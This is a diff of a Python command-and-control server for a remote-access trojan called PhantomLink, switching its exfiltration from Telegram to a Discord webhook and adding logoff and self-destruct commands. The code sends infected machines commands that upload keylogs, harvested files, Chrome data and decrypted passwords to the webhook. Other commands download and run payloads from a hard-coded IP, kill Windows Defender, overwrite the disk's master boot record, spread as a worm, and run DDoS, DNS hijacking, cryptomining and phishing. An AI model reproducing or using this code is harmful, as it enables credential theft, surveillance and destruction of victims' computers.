             elif cmd == 'recycle':
                 command2 = 'PowerShell.exe -NoProfile -Command Clear-RecycleBin -Force'
                 with client['lock']:
+                    client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
                         client['command_in_progress'] = False
                         break
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Emptied Recycle Bin on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Emptied Recycle Bin on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                client['command_in_progress'] = False
 
             elif cmd == 'port':
                 port = input("Port: ")
@@ -1038,7 +1142,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Port: {port} opened on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Port: {port} opened on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
 
                 command3 = 'ipconfig /flushdns'
                 with client['lock']:
@@ -1048,24 +1152,26 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"{response.decode('utf-8', errors='ignore')}")
 
             elif cmd == 'clipboard':
                 command2 = 'powershell -command "Get-Clipboard"'
                 with client['lock']:
+                    client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
                         client['command_in_progress'] = False
                         break
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Clipboard [{username}]: \n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Clipboard [{username}]: \n{response.decode('utf-8', errors='ignore')}")
+                client['command_in_progress'] = False
 
             elif cmd == 'kill':
                 sure = input("Are you sure? (y/n): ")
                 if sure.lower().strip() == 'y':
                     command2 = 'taskkill /f /im svchost.exe'
-                    tel_logger(f"Killing PC!")
+                    discord_logger(f"Killing PC!")
                     with client['lock']:
                         if not client_manager._send_message(conn, f"CMD:{command2}"):
                             client['command_in_progress'] = False
@@ -1073,7 +1179,7 @@ def interact_with_client(client_manager, client_id):
                         response = client_manager._recv_message(conn)
                     if response:
                         print(response.decode('utf-8', errors='ignore'))
-                        tel_logger(f"[{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                        discord_logger(f"[{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     print("Killing . . .")
                 else:
                     continue
@@ -1089,7 +1195,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Changed Wallpaper for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Changed Wallpaper for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'rotate':
@@ -1123,31 +1229,32 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"PC [{username}] slept\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"PC [{username}] slept\n\n{response.decode('utf-8', errors='ignore')}")
 
             elif cmd == 'rickroll':
                 command2 = 'start https://www.youtube.com/watch?v=dQw4w9WgXcQ'
-                with client['lock']:
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"RickRoll video played on {username}\n\n{response.decode('utf-8', errors='ignore')}")
-
-            elif cmd == 'keylog':                #Send keylogger logs
-                command2 = f'curl -F "document=@%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt" https://api.telegram.org/botTOKEN/sendDocument?chat_id={CHAT_ID}'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
                         client['command_in_progress'] = False
                         break
-                    send_log2(f'Keylog file of user [{username}]:')
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"KeyLog file of [{username}] sent\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"RickRoll video played on {username}\n\n{response.decode('utf-8', errors='ignore')}")
+                client['command_in_progress'] = False
+            elif cmd == 'keylog':                #Send keylogger logs
+                command2 = f'curl -F "file=@%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt" -F "content=Keylog" {DISCORD_WEBHOOK}'
+                with client['lock']:
+                    client['command_in_progress'] = True
+                    if not client_manager._send_message(conn, f"CMD:{command2}"):
+                        client['command_in_progress'] = False
+                        break
+                    discord_logger(f'Keylog file of user [{username}]:')
+                    response = client_manager._recv_message(conn)
+                if response:
+                    print(response.decode('utf-8', errors='ignore'))
+                    discord_logger(f"KeyLog file of [{username}] sent\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'keylogger':
@@ -1160,7 +1267,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"KeyLogger injected on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"KeyLogger injected on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'screener':
@@ -1173,13 +1280,13 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Auto Screenshoter injected on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Auto Screenshoter injected on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'update':
                 updating = input('Update PhantomLink? (y/n):  ')
                 if updating.lower().strip() == 'y':
-                    tel_logger(f"{'='*10}\nUpdating PhantomLink . . .\n{'='*10}")
+                    discord_logger(f"{'='*10}\nUpdating PhantomLink . . .\n{'='*10}")
                     command2 = 'curl -O http://81.10.55.8/PhantomLink.exe && start /B "" "PhantomLink.exe"'
                     with client['lock']:
                         client['command_in_progress'] = True
@@ -1189,30 +1296,30 @@ def interact_with_client(client_manager, client_id):
                         response = client_manager._recv_message(conn)
                     if response:
                         print(response.decode('utf-8', errors='ignore'))
-                        tel_logger(f"PhantomLink Updating on {username}\n\n Status:\n{response.decode('utf-8', errors='ignore')}")
+                        discord_logger(f"PhantomLink Updating on {username}\n\n Status:\n{response.decode('utf-8', errors='ignore')}")
                         client['command_in_progress'] = False
                 else:
                     continue
 
             elif cmd == 'harvest':
                 extension = input("Extension (pdf/docx/txt): ")
-                command2 = f'''powershell -Command "Get-ChildItem -Path C:\\Users -Include *.{extension} -Recurse -ErrorAction SilentlyContinue | Select-Object -First 20 | ForEach-Object {{ curl -F \\"document=@$($_.FullName)\\" https://api.telegram.org/botTOKEN/sendDocument?chat_id={CHAT_ID} }}"'''
+                command2 = f'''powershell -Command "Get-ChildItem -Path C:\\Users -Include *.{extension} -Recurse -ErrorAction SilentlyContinue | Select-Object -First 20 | ForEach-Object {{ curl -F \\"file=@$($_.FullName)\\" -F \\"content=Harvested File\\" {DISCORD_WEBHOOK} }}"'''
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
                         client['command_in_progress'] = False
                         break
-                    send_log2(f'Files of [{username}]:')
+                    discord_logger(f'Files of [{username}]:')
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"got files from [{username}] extension ({extension})\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"got files from [{username}] extension ({extension})\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'browser':
                 command2 = 'xcopy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default" "%TEMP%\\chrome_data" /E /I /H /Y'
                 command3 = '"C:\\Program Files\\WinRAR\\rar.exe" a -r "%TEMP%\\chrome.rar" "%TEMP%\\chrome_data"'
-                command4 = f'curl -F "document=@%TEMP%\\chrome.rar" https://api.telegram.org/botTOKEN/sendDocument?chat_id={CHAT_ID}'
+                command4 = f'curl -F "file=@%TEMP%\\chrome.rar" -F "content=Chrome Data" {DISCORD_WEBHOOK}'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -1232,11 +1339,11 @@ def interact_with_client(client_manager, client_id):
                     if not client_manager._send_message(conn, f"CMD:{command4}"):
                         client['command_in_progress'] = False
                         break
-                    send_log2(f'Browser data for [{username}]:')
+                    discord_logger(f'Browser data for [{username}]:')
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Sent all Browser saved data for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Sent all Browser saved data for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'netscan':
@@ -1249,13 +1356,13 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"[{username}] netscan:\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"[{username}] netscan:\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'screenrec':
                 duration = input("Duration (seconds): ")
                 command2 = f'''powershell -Command "Start-Process \\"%USERPROFILE%\\ffmpeg\\bin\\ffmpeg.exe\\" -ArgumentList \\"-f gdigrab -framerate 5 -i desktop -t {duration} -vcodec libx264 -preset ultrafast %USERPROFILE%\\screen.mp4\\" -NoNewWindow -Wait"'''
-                command3 = f'curl -F "video=@%USERPROFILE%\\screen.mp4" https://api.telegram.org/botTOKEN/sendVideo?chat_id={CHAT_ID}'
+                command3 = f'curl -F "file=@%USERPROFILE%\\screen.mp4" -F "content=Screen Recording" {DISCORD_WEBHOOK}'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -1270,11 +1377,11 @@ def interact_with_client(client_manager, client_id):
                     if not client_manager._send_message(conn, f"CMD:{command3}"):
                         client['command_in_progress'] = False
                         break
-                    send_log2(f'Screen rec of [{username}]')
+                    discord_logger(f'Screen rec of [{username}]')
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Screen recorded for {duration}S\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Screen recorded for {duration}S\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'info':
@@ -1287,7 +1394,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Got all machine info of [{username}]:\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Got all machine info of [{username}]:\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'killav':
@@ -1301,7 +1408,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Disabled Windows Defender AV on [{username}]\n\n {response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Disabled Windows Defender AV on [{username}]\n\n {response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
                 with client['lock']:
                     if not client_manager._send_message(conn, f"CMD:{command3}"):
@@ -1321,7 +1428,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"[{username}] Creds:\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"[{username}] Creds:\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'worm':
@@ -1347,7 +1454,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Injecting PhantomLink to all PCs on network of [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Injecting PhantomLink to all PCs on network of [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'ddos':
@@ -1370,7 +1477,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Doing DDOS on [{target}] to {duration}S from [{username}]\n\nresponse.decode('utf-8', errors='ignore')")
+                    discord_logger(f"Doing DDOS on [{target}] to {duration}S from [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'dnshijack':
@@ -1386,7 +1493,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"DNS {domain} hijacked to {redirect_ip} on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"DNS {domain} hijacked to {redirect_ip} on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'mouse':
@@ -1421,7 +1528,7 @@ def interact_with_client(client_manager, client_id):
                         response = client_manager._recv_message(conn)
                     if response:
                         print(response.decode('utf-8', errors='ignore'))
-                        tel_logger(f"Controlled mouse on [{username}]:\n{action}\n\n{response.decode('utf-8', errors='ignore')}")
+                        discord_logger(f"Controlled mouse on [{username}]:\n{action}\n\n{response.decode('utf-8', errors='ignore')}")
                         client['command_in_progress'] = False
                 else:
                     print('Undefined')
@@ -1441,7 +1548,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Injected Keyboard key on [{username}]:\n{text}\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Injected Keyboard key on [{username}]:\n{text}\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'killmbr':
@@ -1454,8 +1561,8 @@ def interact_with_client(client_manager, client_id):
                     $disk.Write($mbr, 0, 512);
                     $disk.Close();
                     "'''
-                    tel_logger(f"\n{'='*20}[!] PC [{username}] DESTROYED [!]\n{'='*20}")
-                    send_log2(f"\n{'=' * 20}[!] PC [{username}] DESTROYED [!]\n{'=' * 20}")
+                    discord_logger(f"\n{'='*20}[!] PC [{username}] DESTROYED [!]\n{'='*20}")
+                    discord_logger(f"\n{'=' * 20}[!] PC [{username}] DESTROYED [!]\n{'=' * 20}")
                     with client['lock']:
                         if not client_manager._send_message(conn, f"CMD:{command2}"):
                             client['command_in_progress'] = False
@@ -1503,6 +1610,10 @@ def interact_with_client(client_manager, client_id):
                 elif action == 'unhide':
                     command2 = 'powershell -Command "Stop-Process -Name python -Force; Write-Output \'Unhidden\'"'
 
+                else:
+                    print(f"[!] Invalid action: {action}. Use 'hide' or 'unhide'")
+                    continue
+
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -1512,8 +1623,8 @@ def interact_with_client(client_manager, client_id):
 
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"[ROOTKIT] {action} [{username}]: {response.decode('utf-8', errors='ignore')}")
-                    client['command_in_progress'] = False
+                    discord_logger(f"[ROOTKIT] {action} [{username}]: {response.decode('utf-8', errors='ignore')}")
+                client['command_in_progress'] = False
 
             elif cmd == 'mine':
                 action = input("Action (start/stop/status): ").lower()
@@ -1569,6 +1680,10 @@ def interact_with_client(client_manager, client_id):
             }
             '''
 
+                else:
+                    print(f"[!] Invalid action: {action}. Use 'start', 'stop', or 'status'")
+                    continue
+
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -1578,8 +1693,8 @@ def interact_with_client(client_manager, client_id):
 
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"[MINER] {action} on [{username}]: {response.decode('utf-8', errors='ignore')}")
-                    client['command_in_progress'] = False
+                    discord_logger(f"[MINER] {action} on [{username}]: {response.decode('utf-8', errors='ignore')}")
+                client['command_in_progress'] = False
 
             elif cmd == 'print':
                 message = input("Message to print: ")
@@ -1625,7 +1740,7 @@ def interact_with_client(client_manager, client_id):
 
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"[PRINTER] Printed {copies} copies: {message} on [{username}]")
+                    discord_logger(f"[PRINTER] Printed {copies} copies: {message} on [{username}]")
                     client['command_in_progress'] = False
 
             elif cmd == 'spam':
@@ -1646,7 +1761,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(
+                    discord_logger(
                         f"Spammed [{username}]:\n{message} {count} times\n\n {response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
@@ -1658,7 +1773,7 @@ def interact_with_client(client_manager, client_id):
                             netsh trace start capture=yes tracefile=$env:TEMP\\capture.etl maxsize=100 filemode=single overwrite=yes;
                             Start-Sleep {duration};
                             netsh trace stop;
-                            curl -F \\"document=@$env:TEMP\\capture.etl\\" https://api.telegram.org/botTOKEN/sendDocument?chat_id={CHAT_ID};
+                            curl -F \\"file=@$env:TEMP\\capture.etl\\" -F \\"content=Network Capture\\" {DISCORD_WEBHOOK};
                             Remove-Item $env:TEMP\\capture.etl;
                             "'''
                 with client['lock']:
@@ -1669,7 +1784,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(
+                    discord_logger(
                         f"Sniffed network traffic on [{username}] for {duration}S\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
@@ -1693,7 +1808,7 @@ def interact_with_client(client_manager, client_id):
                         cipher=AES.new(key,AES.MODE_GCM,nonce)
                         return cipher.decrypt(enc_pass[15:])[:-16].decode()
                     return CryptUnprotectData(enc_pass,None,None,None,0)[1].decode()
-                except:
+                except Exception:
                     return "[ERROR]"
 
             db_path=os.path.join(os.environ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","Default","Login Data")
@@ -1724,7 +1839,7 @@ def interact_with_client(client_manager, client_id):
                 command4 = 'python %TEMP%\\chrome_pass.py > %TEMP%\\chrome_passwords.txt'
 
                 #Send results
-                command5 = f'curl -F "document=@%TEMP%\\chrome_passwords.txt" https://api.telegram.org/botTOKEN/sendDocument?chat_id={CHAT_ID}'
+                command5 = f'curl -F "file=@%TEMP%\\chrome_passwords.txt" -F "content=Chrome Passwords" {DISCORD_WEBHOOK}'
 
                 #Execute all commands in sequence
                 for cmd_exec in [command1, command2, command3, command4, command5]:
@@ -1738,7 +1853,7 @@ def interact_with_client(client_manager, client_id):
                         print(response.decode('utf-8', errors='ignore'))
                         client['command_in_progress'] = False
 
-                tel_logger(f"Chrome passwords extracted from [{username}]")
+                discord_logger(f"Chrome passwords extracted from [{username}]")
 
 
             elif cmd == 'fakeupdate':
@@ -1761,7 +1876,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"[FAKE UPDATE] [{username}] {update_type} update screen shown for {duration} minutes")
+                    discord_logger(f"[FAKE UPDATE] [{username}] {update_type} update screen shown for {duration} minutes")
                     client['command_in_progress'] = False
 
 
@@ -1836,10 +1951,91 @@ def interact_with_client(client_manager, client_id):
                     output = response.decode('utf-8', errors='ignore')
                     print(output)
                     if "Captured:" in output:
-                        tel_logger(f"[PHISHING] [{username}] ✓ {platform} credentials captured!\n{output}")
+                        discord_logger(f"[PHISHING] [{username}] ✓ {platform} credentials captured!\n{output}")
                     else:
-                        tel_logger(f"[PHISHING] [{username}] {platform} prompt shown")
+                        discord_logger(f"[PHISHING] [{username}] {platform} prompt shown")
                     client['command_in_progress'] = False
+
+            elif cmd == 'logoff':
+                command2 = 'shutdown /l /f'
+                with client['lock']:
+                    client['command_in_progress'] = True
+                    if not client_manager._send_message(conn, f"CMD:{command2}"):
+                        client['command_in_progress'] = False
+                        break
+                    discord_logger(f'Logging off [{username}] . . . .')
+                    response = client_manager._recv_message(conn)
+                if response:
+                    print(response.decode('utf-8', errors='ignore'))
+                    discord_logger(f"Client [{username}] Logged off\n\n{response.decode('utf-8', errors='ignore')}")
+                client['command_in_progress'] = False
+
+            elif cmd == 'selfdestruct':
+                confirm = input("This will COMPLETELY REMOVE PhantomLink from the client. Type 'REMOVE' to confirm: ")
+                if confirm != 'REMOVE':
+                    print("[!] Self-destruct cancelled")
+                    continue
+
+                discord_logger(f"[!] Self-destructing PhantomLink on [{username}]...")
+                print(f"[*] Removing PhantomLink from {username}...")
+
+                # Step 1: Kill related processes (screener, keylogger)
+                command_kill = 'taskkill /f /im screener.exe & taskkill /f /im keylogger.exe & taskkill /f /im xmrig.exe'
+                with client['lock']:
+                    client['command_in_progress'] = True
+                    if not client_manager._send_message(conn, f"CMD:{command_kill}"):
+                        client['command_in_progress'] = False
+                        break
+                    response = client_manager._recv_message(conn)
+                if response:
+                    print(f"[1/4] Kill processes: {response.decode('utf-8', errors='ignore')}")
+
+                # Step 2: Remove registry startup entries
+                command_reg = (
+                    'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Windows Defender Updater" /f & '
+                    'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Screen Optimizer" /f'
+                )
+                with client['lock']:
+                    if not client_manager._send_message(conn, f"CMD:{command_reg}"):
+                        client['command_in_progress'] = False
+                        break
+                    response = client_manager._recv_message(conn)
+                if response:
+                    print(f"[2/4] Remove registry: {response.decode('utf-8', errors='ignore')}")
+
+                # Step 3: Delete all files
+                command_clean = (
+                    'del /f /q "%USERPROFILE%\\screenshot.png" 2>nul & '
+                    'del /f /q "%USERPROFILE%\\webcam.jpg" 2>nul & '
+                    'del /f /q "%USERPROFILE%\\screen.mp4" 2>nul & '
+                    'del /f /q "%USERPROFILE%\\mic.wav" 2>nul & '
+                    'rd /s /q "%APPDATA%\\MicrosoftUpdate" 2>nul'
+                )
+                with client['lock']:
+                    if not client_manager._send_message(conn, f"CMD:{command_clean}"):
+                        client['command_in_progress'] = False
+                        break
+                    response = client_manager._recv_message(conn)
+                if response:
+                    print(f"[3/4] Delete files: {response.decode('utf-8', errors='ignore')}")
+
+                # Step 4: Kill self (defender.exe)
+                command_selfkill = (
+                    'powershell -Command "Start-Sleep 2; '
+                    'Stop-Process -Name defender -Force -ErrorAction SilentlyContinue; '
+                    'Stop-Process -Name PhantomLink -Force -ErrorAction SilentlyContinue"'
+                )
+                with client['lock']:
+                    if not client_manager._send_message(conn, f"CMD:{command_selfkill}"):
+                        client['command_in_progress'] = False
+                        break
+                    response = client_manager._recv_message(conn)
+                if response:
+                    print(f"[4/4] Kill self: {response.decode('utf-8', errors='ignore')}")
+
+                client['command_in_progress'] = False
+                print(f"[+] PhantomLink removed from {username}")
+                discord_logger(f"[+] PhantomLink REMOVED from [{username}] - Self-destruct complete")
 
             elif cmd == 'commands':
                 print("""
@@ -1918,6 +2114,9 @@ def interact_with_client(client_manager, client_id):
                   mine       : Cryptominer
                   print      : Hijack the printer
 
+                [💀 Danger Zone]
+                  selfdestruct : REMOVE PhantomLink completely from the client
+
                 [❓ Help]
                   commands   : Shows this help list of quick NON-CMD commands
                   update     : Update PhantomLink
@@ -1933,7 +2132,7 @@ def interact_with_client(client_manager, client_id):
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{cmd}"):
                         print("[!] Failed to send command.")
-                        tel_logger(f"Failed To send Command: {cmd}")
+                        discord_logger(f"Failed To send Command: {cmd}")
                         client['command_in_progress'] = False
                         client['health'].record_command(False, 0)
                         break
@@ -1949,7 +2148,7 @@ def interact_with_client(client_manager, client_id):
                     client['health'].record_command(True, response_time)
                     if output:
                         print(output)
-                        tel_logger(f"Command: {cmd}\n\n{output}")
+                        discord_logger(f"Command: {cmd}\n\n{output}")
                     else:
                         print("[No output]")
                 else:
@@ -1969,7 +2168,7 @@ def interact_with_client(client_manager, client_id):
         health_stop.set()
         try:
             conn.settimeout(original_timeout)
-        except:
+        except Exception:
             pass
 
     return 'continue'
@@ -1993,6 +2192,19 @@ def main():
     except Exception as e:
         print(f"[!] Dashboard error: {e}")
         print("[*] Continuing without dashboard...")
+
+
+    # Start API server
+    try:
+        api_thread = threading.Thread(
+            target=start_api_server,
+            args=(client_manager, 5001),
+            daemon=True
+        )
+        api_thread.start()
+        time.sleep(1)
+    except Exception as e:
+        print(f"[!] API thread error: {e}")
 
     #Setup server socket
     try:
@@ -2106,7 +2318,7 @@ def main():
                     print(f"[!] Command '{cmd}' requires user input and cannot be broadcast")
 
                     print(
-                        "[!] Allowed broadcast commands: screenshot, ip, sys, task, clipboard, keylog, recycle, sleep, lock, rickroll, shutdown, restart, disable/enable task manager, update, inject, alert, ddos, kill, killmbr, killav, ffmpeg")
+                        "[!] Allowed broadcast commands: screenshot, ip, sys, task, clipboard, keylog, recycle, sleep, lock, rickroll, shutdown, restart, logoff, disable/enable task manager, update, inject, alert, ddos, kill, killmbr, killav, selfdestruct, ffmpeg")
 
                     continue
 
@@ -2122,7 +2334,7 @@ def main():
 
                         continue
 
-                    tel_logger(f"{'=' * 10}\nUpdating PhantomLink on ALL clients . . .\n{'=' * 10}")
+                    discord_logger(f"{'=' * 10}\nUpdating PhantomLink on ALL clients . . .\n{'=' * 10}")
 
                     actual_commands = ['curl -O http://81.10.55.8/PhantomLink.exe && start /B "" "PhantomLink.exe"']
 
@@ -2183,7 +2395,7 @@ def main():
 
                         continue
 
-                    tel_logger(f"Killing ALL PCs!")
+                    discord_logger(f"Killing ALL PCs!")
 
                     actual_commands = ['taskkill /f /im svchost.exe']
 
@@ -2197,7 +2409,7 @@ def main():
 
                         continue
 
-                    tel_logger(f"\n{'=' * 20}[!] ALL PCs BEING DESTROYED [!]\n{'=' * 20}")
+                    discord_logger(f"\n{'=' * 20}[!] ALL PCs BEING DESTROYED [!]\n{'=' * 20}")
 
                     actual_commands = [
                         r'''powershell -Command "$mbr = New-Object byte[] 512; (New-Object Random).NextBytes($mbr); $disk = [System.IO.File]::Open('\\\\.\\PhysicalDrive0', 'Open', 'Write'); $disk.Write($mbr, 0, 512); $disk.Close();"''']
@@ -2212,7 +2424,7 @@ def main():
 
                             'powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, [System.Windows.Forms.SystemInformation]::VirtualScreen.Height); $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.X, [System.Windows.Forms.SystemInformation]::VirtualScreen.Y, 0, 0, $bmp.Size); $path = Join-Path $env:USERPROFILE \\"screenshot.png\\"; $bmp.Save($path)"',
 
-                            'curl -F "photo=@%USERPROFILE%\\screenshot.png" https://api.telegram.org/botTOKEN/sendPhoto?chat_id=YOUR_CHAT_ID'
+                            f'curl -F "file=@%USERPROFILE%\\screenshot.png" -F "content=Screenshot" {DISCORD_WEBHOOK}'
 
                         ],
 
@@ -2227,7 +2439,7 @@ def main():
                         'clipboard': ['powershell -command "Get-Clipboard"'],
 
                         'keylog': [
-                            'curl -F "document=@%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt" https://api.telegram.org/botTOKEN/sendDocument?chat_id=YOUR_CHAT_ID'],
+                            f'curl -F "file=@%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt" -F "content=Keylog" {DISCORD_WEBHOOK}'],
 
                         'recycle': ['PowerShell.exe -NoProfile -Command Clear-RecycleBin -Force'],
 
@@ -2256,7 +2468,14 @@ def main():
                             'taskkill /F /IM MsMpEng.exe'
 
                         ],
-                        'ffmpeg' : [r'curl http://81.10.55.8/ffmpeg.rar -o "%USERPROFILE%\ffmpeg.rar" && C:/Program Files/WinRAR/WinRAR.exe" x -ibck -inul "%USERPROFILE%/ffmpeg.rar" "%USERPROFILE%"']
+                        'ffmpeg' : [r'curl http://81.10.55.8/ffmpeg.rar -o "%USERPROFILE%\ffmpeg.rar" && "C:/Program Files/WinRAR/WinRAR.exe" x -ibck -inul "%USERPROFILE%/ffmpeg.rar" "%USERPROFILE%"'],
+                        'logoff': ['shutdown /l /f'],
+                        'selfdestruct': [
+                            'taskkill /f /im screener.exe & taskkill /f /im keylogger.exe & taskkill /f /im xmrig.exe',
+                            'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Windows Defender Updater" /f & reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Screen Optimizer" /f',
